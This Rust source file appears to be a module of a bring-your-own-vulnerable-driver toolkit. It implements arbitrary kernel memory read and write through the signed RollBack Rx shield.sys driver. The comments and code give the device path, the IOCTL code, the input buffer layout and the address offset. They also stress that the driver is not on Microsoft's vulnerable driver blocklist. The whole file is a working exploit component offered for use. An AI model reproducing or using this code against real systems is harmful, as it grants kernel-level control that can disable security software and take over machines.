//! shield.sys — Horizon DataSys RollBack Rx (LOLDrivers #344, May 2026).
//!
//! **Status: NOT blocklisted** as of July 2026. Signed by DigiCert.
//! Device created with zero security descriptor (no ACL, Exclusive=FALSE).
//! No ProbeForRead/ProbeForWrite — user-supplied pointer passed directly to memcpy.
//!
//! Three variants share the same codebase:
//!   - shield.sys
//!   - shield-async.sys
//!   - shieldwp.sys
//!
//! Device: `\\.\EAZShield`
//! IOCTL:  0x96102014 (METHOD_BUFFERED, FILE_ANY_ACCESS)
//! Capability: bidirectional arbitrary kernel memcpy (read + write in one IOCTL)
//!   Input:  4-byte direction (0=write kernel←user, 1=read kernel→user) + u64 dst + u64 src + u32 len
//!   Output: read data returned in output buffer
//!
//! Source: github.com/magicsword-io/LOLDrivers/issues/344

use crate::byovd::VulnDriverIoctl;
use crate::{KrwError, KernelRw};

pub struct Shield;

impl VulnDriverIoctl for Shield {
    fn device_path(&self) -> &[u16] {
        // \\.\EAZShield — device created by the driver with no security descriptor
        static PATH: [u16; 13] = [
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            'E' as u16, 'A' as u16, 'Z' as u16, 'S' as u16,
            'h' as u16, 'i' as u16, 'e' as u16, 'l' as u16,
            'd' as u16,
        ];
        &PATH
    }

    /// Bidirectional IOCTL: same code for read and write (direction byte in input).
    fn read_ioctl(&self) -> u32 { 0x96102014 }
    fn write_ioctl(&self) -> u32 { 0x96102014 }

    /// Shield uses a different struct layout: addr at offset 0x08 in the
    /// user-supplied buffer (destination address for the memcpy).
    fn addr_offset(&self) -> usize { 0x08 }

    fn blocklist_status(&self) -> &'static str {
        "CLEAN: not on Microsoft Vulnerable Driver Blocklist as of July 2026 (LOLDrivers #344)"
    }
}
